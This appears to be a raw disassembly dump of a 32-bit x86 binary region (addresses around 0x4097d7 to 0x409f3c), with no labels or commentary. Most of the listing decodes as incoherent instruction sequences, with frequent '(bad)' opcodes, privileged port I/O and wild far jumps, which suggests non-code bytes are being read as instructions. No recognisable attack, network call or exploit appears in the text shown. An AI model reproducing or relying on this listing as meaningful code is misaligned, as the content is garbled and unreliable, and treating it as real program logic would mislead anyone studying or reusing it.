  4097d7:	and    eax,eax
  4097d9:	ret    0x76e9
  4097dc:	add    al,BYTE PTR [eax]
  4097de:	(bad)  
  4097df:	sti    
  4097e0:	jle    0x409764
  4097e2:	js     0x4097c6
  4097e4:	int3   
  4097e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4097e6:	push   0x3
  4097e8:	jnp    0x409774
  4097ea:	imul   esi,eax,0x71ccf86
  4097f0:	mov    ds,WORD PTR [esi-0x6a304598]
  4097f6:	sub    esp,0xd56c9e8f
  4097fc:	hlt    
  4097fd:	out    dx,eax
  4097fe:	jmp    0x13409a79
  409803:	mov    ds:0x9400cdd5,eax
  409808:	ror    ecx,cl
  40980a:	xchg   ebx,eax
  40980b:	jno    0x4097d3
  40980d:	rcl    edi,0xdb
  409810:	xchg   ecx,eax
  409811:	nop
  409812:	lds    esi,FWORD PTR [eax+0x48fffea3]
  409818:	jmp    FWORD PTR [ebx+0x63]
  40981b:	mov    bl,0x6c
  40981d:	popa   
  40981e:	outs   dx,BYTE PTR ds:[esi]
  40981f:	lods   al,BYTE PTR ds:[esi]
  409820:	pop    es
  409821:	add    BYTE PTR [eax],al
  409823:	test   al,0x4
  409825:	sbb    bl,BYTE PTR [esi]
  409827:	sbb    BYTE PTR [edx],bl
  409829:	pop    es
  40982a:	pop    ds
  40982b:	add    BYTE PTR [eax],al
  40982d:	add    BYTE PTR [eax],al
  40982f:	add    BYTE PTR [eax-0x2],ah
  409832:	(bad)  
  409833:	push   DWORD PTR [edx]
  409835:	xchg   DWORD PTR [ecx-0x21715761],eax
  40983b:	add    BYTE PTR [eax],cl
  40983d:	pop    ebx
  40983e:	push   cs
  40983f:	pop    ecx
  409840:	xor    edi,DWORD PTR [eax+0x4a]
  409843:	dec    eax
  409844:	push   eax
  409845:	push   esp
  409846:	inc    esi
  409847:	push   eax
  409848:	or     eax,DWORD PTR [edx]
  40984a:	add    dh,BYTE PTR [ebp+0x2f]
  40984d:	imul   ecx,DWORD PTR [eax+0x5f],0x5056229b
  409854:	lea    eax,[ecx+0x47]
  409857:	or     cl,al
  409859:	adc    al,0x44
  40985b:	cmp    al,0x68
  40985d:	jnp    0x4098ba
  40985f:	inc    ebp
  409860:	or     bl,BYTE PTR [esi+0x2f]
  409863:	push   0xffffffac
  409865:	jno    0x4098c9
  409867:	cmp    BYTE PTR [ebx-0x63aaddf9],bl
  40986d:	add    eax,0x44db0000
  409872:	inc    ebx
  409873:	inc    ebx
  409874:	(bad)  
  409875:	aas    
  409876:	inc    edi
  409877:	pop    esp
  409878:	add    DWORD PTR [esi],eax
  40987a:	add    BYTE PTR [eax],al
  40987c:	mov    ebp,0x9c612336
  409881:	add    eax,0x3d750000
  409886:	ret    
  409887:	lds    esi,FWORD PTR [ebp-0x41]
  40988a:	outs   dx,DWORD PTR ds:[esi]
  40988b:	cmp    DWORD PTR [eax-0x568bde2b],esp
  409891:	(bad)  
  409892:	ja     0x4098df
  409894:	add    BYTE PTR [eax],al
  409896:	add    BYTE PTR [eax],al
  409898:	add    BYTE PTR [edx+0x75002071],dl
  40989e:	scas   eax,DWORD PTR es:[edi]
  40989f:	gs mov cl,BYTE PTR cs:[ecx+0x2b]
  4098a4:	xor    dl,al
  4098a6:	jmp    0x4098aa
  4098a8:	add    BYTE PTR [ebp-0x59],dh
  4098ab:	mov    dl,0xd6
  4098ad:	push   ds
  4098ae:	jmp    0x4098b2
  4098b0:	add    BYTE PTR [ebp-0x72],dh
  4098b3:	fldenv [esi+eax*1-0x212260a5]
  4098ba:	jge    0x4098be
  4098bc:	add    BYTE PTR [ebp-0x66],dh
  4098bf:	rcl    ebp,0xda
  4098c2:	inc    ebp
  4098c3:	idiv   edi
  4098c5:	or     dh,bh
  4098c7:	or     BYTE PTR [edx],bl
  4098c9:	mov    es,WORD PTR [edx]
  4098cb:	cmp    al,0x0
  4098cd:	jne    0x4098ba
  4098cf:	sbb    eax,0x42198e1e
  4098d4:	inc    ecx
  4098d5:	aas    
  4098d6:	fmul   QWORD PTR [eax+eax*1+0x75]
  4098da:	add    esi,0xc296adc3
  4098e0:	repnz (bad) 
  4098e2:	jns    0x40987f
  4098e4:	cli    
  4098e5:	repnz ins DWORD PTR es:[edi],dx
  4098e7:	lahf   
  4098e8:	(bad)  
  4098e9:	mul    BYTE PTR [ecx-0x7d]
  4098ec:	loop   0x409963
  4098ee:	jmp    0x30e:0xda75161a
  4098f5:	jg     0x4098c5
  4098f7:	add    al,BYTE PTR [eax]
  4098f9:	jne    0x409920
  4098fb:	int3   
  4098fc:	mov    BYTE PTR [eax],0x0
  4098ff:	add    BYTE PTR [eax],al
  409901:	add    dh,al
  409903:	push   es
  409904:	sahf   
  409905:	call   DWORD PTR [edx-0x3537b9ff]
  40990b:	cmp    BYTE PTR [eax],0xd9
  40990e:	scas   al,BYTE PTR es:[edi]
  40990f:	mov    esi,0x2750362
  409914:	cli    
  409915:	adc    DWORD PTR [ebx-0x26f92000],ecx
  40991b:	outs   dx,DWORD PTR ds:[esi]
  40991c:	jl     0x409927
  40991e:	lds    eax,FWORD PTR [edi]
  409920:	(bad)  
  409921:	aas    
  409922:	mov    BYTE PTR [edi],ch
  409924:	jae    0x409988
  409926:	ficom  DWORD PTR [edx]
  409928:	jmp    0x4d430e30
  40992d:	aas    
  40992e:	retf   
  40992f:	addr16 pop ss
  409931:	jae    0x4098fd
  409933:	cmp    BYTE PTR [ecx],cl
  409935:	xor    BYTE PTR [esi+0x77],bl
  409938:	push   ebx
  409939:	jnp    0x4099b0
  40993b:	add    dh,cl
  40993d:	or     eax,0x3ed026b
  409942:	jne    0x409946
  409944:	retf   
  409945:	in     al,0x2f
  409947:	shl    DWORD PTR [esp+eax*1-0x2c4cfd8b],0x26
  40994f:	sar    BYTE PTR [ebx+0x688cef99],cl
  409955:	add    cl,0xcb
  409958:	mov    bl,0xf4
  40995a:	mov    ebp,0xed8697c7
  40995f:	jg     0x4099ce
  409961:	pushf  
  409962:	(bad)
  409965:	mov    es,WORD PTR [eax]
  409967:	add    BYTE PTR [eax],al
  409969:	add    BYTE PTR [eax],al
  40996b:	cmc    
  40996c:	xchg   DWORD PTR [ebp-0x6b],esi
  40996f:	test   eax,0x1ad5ac8
  409974:	aam    0x49
  409976:	out    dx,al
  409977:	iret   
  409978:	icebp  
  409979:	cmp    eax,0x47e89bc3
  40997e:	in     eax,0xd0
  409980:	add    bl,BYTE PTR [eax+0x591256]
  409986:	xchg   esp,eax
  409987:	jbe    0x40998b
  409989:	add    BYTE PTR [ecx],ch
  40998b:	lods   al,BYTE PTR ds:[esi]
  40998c:	aad    0xda
  40998e:	inc    esi
  40998f:	out    0x82,al
  409991:	jg     0x4099cd
  409993:	mov    ch,0xc2
  409995:	aad    0x3f
  409997:	mov    cl,0xbf
  409999:	shl    BYTE PTR [ebx],cl
  40999b:	cmp    edx,ebx
  40999d:	shl    DWORD PTR [edi],cl
  40999f:	cmp    al,0x87
  4099a1:	xchg   esp,eax
  4099a2:	pop    esi
  4099a3:	imul   eax,eax,0xcf4115c6
  4099a9:	ret    0x6308
  4099ac:	in     al,dx
  4099ad:	dec    ah
  4099af:	push   eax
  4099b0:	xlat   BYTE PTR ds:[ebx]
  4099b1:	lahf   
  4099b2:	jecxz  0x409a0f
  4099b4:	jecxz  0x409961
  4099b6:	les    ecx,FWORD PTR [ebx-0x1f]
  4099b9:	loope  0x409984
  4099bb:	aam    0xa6
  4099bd:	(bad)  
  4099be:	mov    edx,0xbff5f826
  4099c3:	ds in  eax,dx
  4099c5:	lods   eax,DWORD PTR ds:[esi]
  4099c6:	ja     0x409a3e
  4099c8:	add    al,BYTE PTR [eax]
  4099ca:	out    dx,al
  4099cb:	ret    0x2
  4099ce:	out    0x0,al
  4099d0:	add    BYTE PTR [eax],al
  4099d2:	add    BYTE PTR [eax],al
  4099d4:	mov    ds:0xb1de0043,al
  4099d9:	add    al,BYTE PTR [eax]
  4099db:	or     dh,BYTE PTR [ecx+0x61]
  4099de:	add    BYTE PTR [ebx],cl
  4099e0:	jns    0x409a4b
  4099e2:	add    BYTE PTR [edi],dl
  4099e4:	jno    0x409a43
  4099e6:	add    ch,dh
  4099e8:	jbe    0x409a12
  4099ea:	add    BYTE PTR ds:0xfd006671,cl
  4099f0:	jbe    0x4099f4
  4099f2:	add    BYTE PTR [edi-0x24bcb6cd],ch
  4099f8:	push   ebp
  4099f9:	popa   
  4099fa:	je     0x4099c8
  4099fc:	jbe    0x409a00
  4099fe:	add    BYTE PTR [edi+0x41493b],ah
  409a04:	mov    eax,0xb0694656
  409a09:	popa   
  409a0a:	add    BYTE PTR [eax],al
  409a0c:	retf   0x493f
  409a0f:	inc    esi
  409a10:	shl    BYTE PTR [ecx+0x73],1
  409a13:	push   0x69625ddf
  409a18:	repnz popa 
  409a1a:	je     0x409a1c
  409a1c:	retf   0x493f
  409a1f:	inc    esp
  409a20:	stc    
  409a21:	ins    BYTE PTR es:[edi],dx
  409a22:	je     0x409a96
  409a24:	add    esi,DWORD PTR [edi+0x0]
  409a27:	add    BYTE PTR [eax],ch
  409a29:	cld    
  409a2a:	aas    
  409a2b:	add    BYTE PTR [edx],bh
  409a2d:	dec    ebp
  409a2e:	inc    ecx
  409a2f:	add    BYTE PTR [edx+0x2a00407c],bl
  409a35:	push   ebx
  409a36:	inc    edx
  409a37:	add    BYTE PTR [eax],al
  409a39:	add    BYTE PTR [eax],al
  409a3b:	add    BYTE PTR [eax],al
  409a3d:	dec    esp
  409a3e:	add    al,BYTE PTR [eax]
  409a40:	add    BYTE PTR [ebp+0x5944433c],cl
  409a46:	inc    eax
  409a47:	inc    edi
  409a48:	dec    eax
  409a49:	gs inc esp
  409a4b:	dec    ebx
  409a4c:	dec    esp
  409a4d:	push   ecx
  409a4e:	dec    eax
  409a4f:	dec    edi
  409a50:	push   eax
  409a51:	jge    0x409a9f
  409a53:	push   ebx
  409a54:	push   esp
  409a55:	imul   edx,DWORD PTR [eax+0x57],0x6154b558
  409a5c:	bound  ebp,QWORD PTR [edi+0x62]
  409a5f:	imul   sp,WORD PTR gs:[esi+0x69],0x6a
  409a65:	ja     0x409ad1
  409a67:	ins    DWORD PTR es:[edi],dx
  409a68:	outs   dx,BYTE PTR ds:[esi]
  409a69:	sub    DWORD PTR [esi+0x71],0x72
  409a6d:	fbld   TBYTE PTR [ebp+0x75]
  409a70:	jbe    0x409a4d
  409a72:	jns    0x409aed
  409a74:	jp     0x409a82
  409a76:	xor    DWORD PTR [edx],esi
  409a78:	xor    ebp,DWORD PTR [eax+0x25]
  409a7b:	ss aaa 
  409a7d:	xchg   esp,eax
  409a7e:	cmp    DWORD PTR [ebx],ebp
  409a80:	das    
  409a81:	jne    0x409a6e
  409a83:	add    al,BYTE PTR [eax]
  409a85:	jne    0x409a72
  409a87:	add    al,BYTE PTR [eax]
  409a89:	jne    0x409a4a
  409a8b:	push   ds
  409a8c:	and    al,0x59
  409a8e:	mov    dh,0x74
  409a90:	jae    0x409ab3
  409a92:	mov    dh,0x70
  409a94:	ja     0x409aa3
  409a96:	mov    dl,0x7c
  409a98:	jnp    0x409aeb
  409a9a:	(bad)  
  409a9b:	push   ds
  409a9c:	and    al,0x59
  409a9e:	mov    edi,0x3e1e
  409aa3:	add    BYTE PTR [eax],al
  409aa5:	add    BYTE PTR [edx],bh
  409aa7:	stos   DWORD PTR es:[edi],eax
  409aa8:	inc    ecx
  409aa9:	inc    edx
  409aaa:	mov    dh,0x9f
  409aac:	cmp    eax,0x49b3b246
  409ab1:	dec    edx
  409ab2:	scas   al,BYTE PTR es:[edi]
  409ab3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ab4:	inc    ebp
  409ab5:	dec    esi
  409ab6:	stos   BYTE PTR es:[edi],al
  409ab7:	fwait
  409ab8:	push   ecx
  409ab9:	push   edx
  409aba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409abb:	(bad)  
  409abc:	dec    ebp
  409abd:	push   esi
  409abe:	mov    ds:0x99242007,al
  409ac3:	call   FWORD PTR [edi]
  409ac5:	pop    eax
  409ac6:	pushf  
  409ac7:	xor    DWORD PTR [ebp+0x5c],ebx
  409aca:	shl    BYTE PTR ds:0x49946059,1
  409ad0:	gs fs cwde 
  409ad3:	cmp    eax,0x418c6861
  409ad8:	ins    DWORD PTR es:[edi],dx
  409ad9:	ins    BYTE PTR es:[edi],dx
  409ada:	mov    al,ds:0x84706935
  409adf:	jmp    0x409ae3
  409ae1:	add    BYTE PTR [ebp-0x16],dh
  409ae4:	add    eax,DWORD PTR [esi*2+0x7541bb11]
  409aeb:	std    
  409aec:	ret    
  409aed:	inc    ecx
  409aee:	jne    0x409aff
  409af0:	les    eax,FWORD PTR [ecx+0x75]
  409af3:	sbb    ecx,DWORD PTR [edi+0x52]
  409af6:	xor    ah,BYTE PTR [esi]
  409af8:	add    al,0x0
  409afa:	jne    0x409b17
  409afc:	inc    ebx
  409afd:	push   esp
  409afe:	add    dh,BYTE PTR ss:[ecx-0x4bfd8afd]
  409b05:	dec    ecx
  409b06:	es dec edi
  409b08:	stos   DWORD PTR es:[edi],eax
  409b09:	push   esp
  409b0a:	add    BYTE PTR [eax],al
  409b0c:	add    BYTE PTR [eax],al
  409b0e:	add    BYTE PTR [esi],dh
  409b10:	push   eax
  409b11:	mov    al,ds:0x9a023045
  409b16:	dec    esi
  409b17:	aaa    
  409b18:	push   ecx
  409b19:	stos   BYTE PTR es:[edi],al
  409b1a:	push   ebp
  409b1b:	sub    al,0x40
  409b1d:	lods   al,BYTE PTR ds:[esi]
  409b1e:	add    esi,DWORD PTR [ebp+0x2]
  409b21:	lahf   
  409b22:	dec    eax
  409b23:	and    DWORD PTR [ebx-0x51],ecx
  409b26:	pop    edx
  409b27:	jne    0x409b2b
  409b29:	lods   al,BYTE PTR ds:[esi]
  409b2a:	es es aas 
  409b2d:	test   al,0x55
  409b2f:	mov    dh,0x4a
  409b31:	jmp    0xb4431039
  409b36:	ds (bad) 
  409b38:	cmp    esp,DWORD PTR [ebx+eax*1+0x4baa0275]
  409b3f:	mov    eax,0xa048a23f
  409b44:	dec    esi
  409b45:	jmp    0x2c43104d
  409b4a:	dec    ebx
  409b4b:	mov    ah,0x3f
  409b4d:	cmp    eax,0x3549cb4d
  409b52:	pop    ebp
  409b53:	jne    0x409b57
  409b55:	sbb    eax,DWORD PTR [ecx-0x3b]
  409b58:	inc    ebx
  409b59:	sbb    edx,DWORD PTR [eax+0x75]
  409b5c:	add    bl,BYTE PTR [esi+eax*2]
  409b5f:	rol    DWORD PTR [ebx+0x2a],0x4b
  409b63:	jne    0x409b67
  409b65:	cmp    al,BYTE PTR [ecx-0x4c]
  409b68:	push   eax
  409b69:	sub    cl,BYTE PTR [ebp+esi*2+0x2]
  409b6d:	cmp    DWORD PTR [edx+0x42],edx
  409b70:	push   edx
  409b71:	cmp    DWORD PTR [ebp+0x0],eax
  409b74:	add    BYTE PTR [eax],al
  409b76:	add    BYTE PTR [eax],al
  409b78:	inc    ecx
  409b79:	aas    
  409b7a:	xor    DWORD PTR [esi*2+0x2a521902],eax
  409b81:	push   edx
  409b82:	add    BYTE PTR [edi],ch
  409b84:	inc    eax
  409b85:	inc    esp
  409b86:	inc    esp
  409b87:	jmp    0xb4409e02
  409b8c:	cmp    ecx,DWORD PTR [ebp+eax*2-0x17]
  409b90:	jbe    0x409b94
  409b92:	add    BYTE PTR [edi+edi*1+0x769d4f3f],ah
  409b99:	add    al,BYTE PTR [eax]
  409b9b:	mov    ch,0x3b
  409b9d:	aas    
  409b9e:	dec    ebx
  409b9f:	jmp    0xaa409e1a
  409ba4:	cmp    edx,DWORD PTR [edx+0x59]
  409ba7:	jmp    0xbd409e22
  409bac:	and    al,0x41
  409bae:	inc    ebx
  409baf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409bb0:	jbe    0x409bb4
  409bb2:	add    BYTE PTR [esi-0x61b6b13a],ah
  409bb8:	mov    al,0x4f
  409bba:	add    BYTE PTR [edx-0x5bb1bb45],ch
  409bc0:	mov    bh,0x4e
  409bc2:	add    BYTE PTR [ecx-0x5effb15b],bl
  409bc8:	mov    ch,0x41
  409bca:	inc    esp
  409bcb:	jmp    0x25409e46
  409bd0:	mov    ah,0x46
  409bd2:	inc    ebp
  409bd3:	cmp    eax,0x4a0002b4
  409bd8:	xchg   edx,eax
  409bd9:	outs   dx,BYTE PTR fs:[esi]
  409bdb:	dec    esp
  409bdc:	add    BYTE PTR [eax],al
  409bde:	add    BYTE PTR [eax],al
  409be0:	add    BYTE PTR [esi-0x6cb19692],dl
  409be6:	add    al,BYTE PTR [eax]
  409be8:	cmp    DWORD PTR [edi+0x5c307863],eax
  409bee:	pop    edi
  409bef:	outs   dx,DWORD PTR ds:[esi]
  409bf0:	pop    ss
  409bf1:	fwait
  409bf2:	pop    ebp
  409bf3:	arpl   WORD PTR ds:0xe96e6388,dx
  409bf9:	jbe    0x409bfd
  409bfb:	add    BYTE PTR [edx],cl
  409bfd:	push   edx
  409bfe:	fs je  0x409c01
  409c01:	jno    0x409c5f
  409c03:	je     0x409c32
  409c05:	push   0xd0676e61
  409c0a:	data16 add BYTE PTR [eax],al
  409c0d:	shl    BYTE PTR [eax+0x61],0x6e
  409c11:	lahf   
  409c12:	push   esp
  409c13:	gs jb  0x409c7f
  409c16:	popa   
  409c17:	outs   dx,BYTE PTR ds:[esi]
  409c18:	arpl   WORD PTR [ebx-0x4c9196ae],di
  409c1e:	(bad)  
  409c1f:	(bad)  
  409c20:	jmp    ecx
  409c22:	outs   dx,BYTE PTR ds:[esi]
  409c23:	addr16 jb 0x409bd3
  409c26:	push   edx
  409c27:	add    BYTE PTR gs:[edi-0x48918a9a],bh
  409c2e:	popa   
  409c2f:	fs add bh,ah
  409c32:	popa   
  409c33:	gs jo  0x409bdf
  409c36:	pop    ebp
  409c37:	ins    BYTE PTR es:[edi],dx
  409c38:	imul   edx,DWORD PTR [edx],0xff000063
  409c3e:	imul   ebp,DWORD PTR [edi+0x73],0x5f1
  409c45:	add    BYTE PTR [eax],al
  409c47:	add    BYTE PTR [eax],al
  409c49:	add    BYTE PTR [ecx],cl
  409c4b:	push   es
  409c4c:	pop    ecx
  409c4d:	add    BYTE PTR [esi+eax*1+0x0],bl
  409c51:	add    BYTE PTR [edx],cl
  409c53:	push   es
  409c54:	je     0x409c56
  409c56:	aam    0x6
  409c58:	je     0x409c5a
  409c5a:	dec    esp
  409c5b:	push   es
  409c5c:	add    BYTE PTR [eax],al
  409c5e:	lods   al,BYTE PTR ds:[esi]
  409c5f:	and    eax,0x67c0000
  409c64:	add    BYTE PTR [eax],al
  409c66:	mov    ds:0x2a0040e6,al
  409c6b:	out    0x40,eax
  409c6d:	add    al,dl
  409c6f:	out    0x40,al
  409c71:	add    cl,bh
  409c73:	in     al,0x40
  409c75:	add    BYTE PTR [ebx-0x5fffbf29],al
  409c7b:	cwde   
  409c7c:	add    BYTE PTR ds:[ebp+0x20],dh
  409c80:	pop    edi
  409c81:	je     0x409cb6
  409c83:	add    ch,BYTE PTR [eax+0x65]
  409c86:	sub    al,0x19
  409c88:	pop    esi
  409c89:	outs   dx,DWORD PTR ds:[esi]
  409c8a:	addr16 (bad) 
  409c8c:	bound  esi,QWORD PTR [esp+ebx*2+0x8]
  409c90:	inc    dx
  409c92:	dec    esp
  409c93:	and    esp,DWORD PTR [ebx+0x6e]
  409c96:	pop    ecx
  409c97:	xlat   BYTE PTR ds:[ebx]
  409c98:	pop    ebp
  409c99:	inc    ebp
  409c9a:	cmp    eax,0x750002db
  409c9f:	lods   al,BYTE PTR ds:[esi]
  409ca0:	pop    ebp
  409ca1:	je     0x409cd6
  409ca3:	ret    0x6566
  409ca6:	sub    al,0xd9
  409ca8:	pop    esp
  409ca9:	outs   dx,DWORD PTR ds:[esi]
  409caa:	daa    
  409cab:	mov    esi,0x7461
  409cb0:	add    BYTE PTR [eax],al
  409cb2:	add    BYTE PTR [eax+ecx*8],bl
  409cb5:	fs inc edx
  409cb7:	or     al,0xa3
  409cb9:	popa   
  409cba:	outs   dx,BYTE PTR ds:[esi]
  409cbb:	sbb    DWORD PTR [edi-0x788affa3],edx
  409cc1:	jmp    0x95811207
  409cc6:	aas    
  409cc7:	jne    0x409d2c
  409cc9:	addr16 inc ebx
  409ccb:	jne    0x409d40
  409ccd:	addr16 inc ebx
  409ccf:	jne    0x409cac
  409cd1:	add    al,BYTE PTR [eax]
  409cd3:	jne    0x409c63
  409cd5:	xchg   ebx,ebp
  409cd7:	hlt    
  409cd8:	out    dx,al
  409cd9:	push   0x5
  409cdb:	jne    0x409cb8
  409cdd:	dec    esp
  409cde:	push   edi
  409cdf:	iret   
  409ce0:	jmp    0x409d4a
  409ce2:	add    dh,al
  409ce4:	fs sti 
  409ce6:	inc    BYTE PTR [eax+0x75400e1b]
  409cec:	pop    esp
  409ced:	mov    edi,0xc2df50b
  409cf2:	add    BYTE PTR [eax+0x797c7fef],cl
  409cf8:	fld    TBYTE PTR [esi+0x27]
  409cfb:	clc    
  409cfc:	add    DWORD PTR [esi+0x13f1566f],esp
  409d02:	or     dh,bh
  409d04:	enter  0x4c80,0xd3
  409d08:	add    ecx,ebp
  409d0a:	mov    bh,BYTE PTR [ecx]
  409d0c:	out    dx,al
  409d0d:	imul   eax,ebx,0x58
  409d10:	adc    al,0x16
  409d12:	cmc    
  409d13:	dec    ecx
  409d14:	inc    BYTE PTR [eax+0xb4]
  409d1a:	add    BYTE PTR [eax],al
  409d1c:	jg     0x409d20
  409d1e:	jmp    0xe3bb6fab
  409d23:	pop    es
  409d24:	lock not ebx
  409d27:	dec    ebx
  409d28:	retw   0xba3f
  409d2c:	stos   BYTE PTR es:[edi],al
  409d2d:	lock call 0xf1878837
  409d33:	dec    ebx
  409d34:	and    DWORD PTR [eax],eax
  409d36:	mov    cl,0x6e
  409d38:	mov    ds:0x2507ab7e,al
  409d3d:	pop    edx
  409d3e:	and    BYTE PTR [ebx],al
  409d40:	jne    0x409d44
  409d42:	adc    cl,BYTE PTR [edx]
  409d44:	call   0xdd948a8f
  409d49:	mov    esp,0xda7503e8
  409d4e:	jnp    0x409d46
  409d50:	jne    0x409d54
  409d52:	jb     0x409d47
  409d54:	icebp  
  409d55:	clc    
  409d56:	je     0x409d2b
  409d58:	inc    DWORD PTR [ebp-0x1b]
  409d5b:	dec    ebp
  409d5c:	pop    ebp
  409d5d:	push   es
  409d5e:	pop    es
  409d5f:	add    esi,DWORD PTR [ebp+0x79]
  409d62:	sub    esi,eax
  409d64:	icebp  
  409d65:	ret    0xfc5d
  409d68:	enter  0xeada,0xfe
  409d6c:	sub    dh,al
  409d6e:	shr    DWORD PTR [ecx+esi*8+0x1bee60ad],0xf0
  409d76:	ror    BYTE PTR [edi+0x18],1
  409d79:	add    eax,DWORD PTR [eax]
  409d7b:	jmp    0x64cda028
  409d80:	add    BYTE PTR [eax],al
  409d82:	add    BYTE PTR [eax],al
  409d84:	add    BYTE PTR [eax+esi*8+0x7ba1a6fe],al
  409d8b:	inc    esp
  409d8c:	in     eax,dx
  409d8d:	xchg   ebx,eax
  409d8e:	inc    ebp
  409d8f:	cld    
  409d90:	bound  esi,QWORD PTR [edi+0x7b0055e7]
  409d96:	add    cl,BYTE PTR [ebx-0x391a77f]
  409d9c:	fs (bad) 
  409d9e:	jae    0x409d6e
  409da0:	imul   eax,DWORD PTR [edx+edi*8-0x1],0x3f7b6e61
  409da8:	add    eax,0xf8740438
  409dad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dae:	cmp    al,ch
  409db0:	sub    ebp,DWORD PTR [ebx-0x41490111]
  409db6:	stos   DWORD PTR es:[edi],eax
  409db7:	or     ecx,ebp
  409db9:	jbe    0x409d3e
  409dbb:	fs cmp eax,0xec605a79
  409dc1:	jbe    0x409dc5
  409dc3:	lea    esp,[ecx+esi*8-0x17]
  409dc7:	(bad)  
  409dc8:	sbb    eax,DWORD PTR es:[edx]
  409dcb:	push   eax
  409dcc:	push   ds
  409dcd:	mov    WORD PTR [edx+0x16],es
  409dd0:	test   eax,0xdd447b76
  409dd5:	sti    
  409dd6:	ret    0x990b
  409dd9:	mov    esp,0xba70025c
  409dde:	cli    
  409ddf:	mov    WORD PTR [edx+0x72],?
  409de2:	dec    edx
  409de3:	mov    DWORD PTR [edx+0x42],edi
  409de6:	out    0x24,eax
  409de8:	add    DWORD PTR [eax],eax
  409dea:	add    BYTE PTR [eax],al
  409dec:	add    BYTE PTR [eax],al
  409dee:	jae    0x409df2
  409df0:	mov    esp,DWORD PTR [eiz*1+0x30a05e50]
  409df7:	pop    es
  409df8:	add    dh,cl
  409dfa:	pushf  
  409dfb:	(bad)  
  409dfc:	out    0x0,eax
  409dfe:	mov    dh,0xf0
  409e00:	(bad)  
  409e01:	jmp    DWORD PTR [esi+0x6a006a16]
  409e07:	repz adc eax,DWORD PTR [eax+0x2a]
  409e0b:	inc    ebx
  409e0c:	add    BYTE PTR [ebx+0x56c1eec8],al
  409e12:	addr16 ja 0x409e39
  409e15:	or     BYTE PTR [edi+0x41],dl
  409e18:	cmp    al,0x8d
  409e1a:	call   0x561e:0x8a8a5046
  409e21:	call   0x40a4a4
  409e26:	push   0xffffffce
  409e28:	dec    esi
  409e29:	or     cl,ah
  409e2b:	add    dh,BYTE PTR [ebx]
  409e2d:	shl    BYTE PTR [edx-0x16fffd3c],0x6f
  409e34:	jmp    0x409e87
  409e36:	in     eax,dx
  409e37:	outs   dx,DWORD PTR ds:[esi]
  409e38:	add    eax,0xff830c8b
  409e3d:	dec    DWORD PTR [edi+edx*2-0x153600a9]
  409e44:	mov    ebx,DWORD PTR [ebp+0x44]
  409e47:	retf   
  409e48:	int    0x7d
  409e4a:	mov    WORD PTR [edx],es
  409e4c:	test   al,al
  409e4e:	fdiv   DWORD PTR [edi+edi*8]
  409e51:	jne    0x409e53
  409e53:	add    BYTE PTR [eax],al
  409e55:	add    BYTE PTR [eax],al
  409e57:	nop
  409e58:	ins    BYTE PTR es:[edi],dx
  409e59:	(bad)  
  409e5c:	(bad)  
  409e5e:	jne    0x409ea0
  409e60:	retf   0xcc
  409e63:	dec    esp
  409e64:	add    bh,bh
  409e66:	jne    0x409edc
  409e68:	ins    BYTE PTR es:[edi],dx
  409e69:	imul   eax
  409e6b:	cs lock (bad) 
  409e6e:	call   edi
  409e70:	sti    
  409e71:	mov    cl,BYTE PTR [ebp+0x44]
  409e74:	outs   dx,DWORD PTR ds:[esi]
  409e75:	jg     0x409df7
  409e77:	sbb    eax,0x75570002
  409e7c:	ret    
  409e7d:	std    
  409e7e:	jge    0x409ef5
  409e80:	(bad)  [ebx]
  409e82:	shl    al,0xc4
  409e85:	add    BYTE PTR [edi-0x36b2f2cb],bl
  409e8b:	aaa    
  409e8c:	in     al,0x2
  409e8e:	push   ebp
  409e8f:	out    dx,al
  409e90:	scas   eax,DWORD PTR es:[edi]
  409e91:	test   bl,ch
  409e93:	inc    ebp
  409e94:	sub    BYTE PTR [ebp-0x29],bh
  409e97:	adc    BYTE PTR [ebp-0x3b],0x47
  409e9b:	inc    ebx
  409e9c:	sub    al,0x7d
  409e9e:	lock imul esp,edx,0x9d6f753a
  409ea5:	inc    esi
  409ea6:	cld    
  409ea7:	pop    edi
  409ea8:	nop
  409ea9:	pop    es
  409eaa:	(bad)  
  409eab:	xor    BYTE PTR [edi+0x5c],dh
  409eae:	push   0x75
  409eb0:	pop    esp
  409eb1:	ja     0x409eaf
  409eb3:	call   0x75aa7156
  409eb8:	push   ebx
  409eb9:	iret   
  409eba:	mov    DWORD PTR [eax],0x0
  409ec0:	je     0x409e9d
  409ec2:	jnp    0x409ec9
  409ec4:	out    dx,al
  409ec5:	pop    ebx
  409ec6:	test   BYTE PTR [eax],al
  409ec8:	jne    0x409ea5
  409eca:	jge    0x409f18
  409ecc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ecd:	mov    ch,bh
  409ecf:	je     0x409f4a
  409ed1:	xor    al,0x77
  409ed3:	or     BYTE PTR [ebp+0x7500706d],cl
  409ed9:	jo     0x409ec7
  409edb:	test   BYTE PTR [edx-0x69],dh
  409ede:	adc    eax,0x5903c253
  409ee3:	jmp    DWORD PTR [edx-0x4]
  409ee6:	jge    0x409ebf
  409ee8:	out    dx,al
  409ee9:	fistp  DWORD PTR [ecx+eax*1-0x2]
  409eed:	sbb    esi,ecx
  409eef:	ud0    edx,DWORD PTR [edi]
  409ef2:	fnstsw WORD PTR ds:0x7f7be4ee
  409ef8:	cmc    
  409ef9:	add    eax,ebp
  409efb:	add    esi,DWORD PTR [ebp+0x7f]
  409efe:	sub    eax,DWORD PTR [eax]
  409f00:	les    edi,FWORD PTR [edi+0x23]
  409f03:	cld    
  409f04:	(bad)
  409f07:	cld    
  409f08:	stos   BYTE PTR es:[edi],al
  409f09:	js     0x409eb4
  409f0b:	(bad)  [edx]
  409f0d:	push   0xc1f103e9
  409f12:	cmp    al,0xf
  409f14:	add    dh,BYTE PTR [edi-0x23]
  409f17:	jl     0x409f49
  409f19:	in     eax,dx
  409f1a:	sbb    edi,esp
  409f1c:	inc    edi
  409f1d:	fiadd  DWORD PTR [eax]
  409f1f:	add    al,0x75
  409f21:	add    dl,BYTE PTR [esi+0x76]
  409f27:	add    BYTE PTR [eax],al
  409f29:	ins    DWORD PTR es:[edi],dx
  409f2a:	xchg   DWORD PTR [eax-0x6f3f0600],ebp
  409f30:	dec    edx
  409f31:	jl     0x409f35
  409f33:	jmp    0xa970aa14
  409f38:	push   eax
  409f39:	and    ecx,DWORD PTR [ecx-0x60]
  409f3c:	lds    esi,FWORD PTR [edx+0x2]
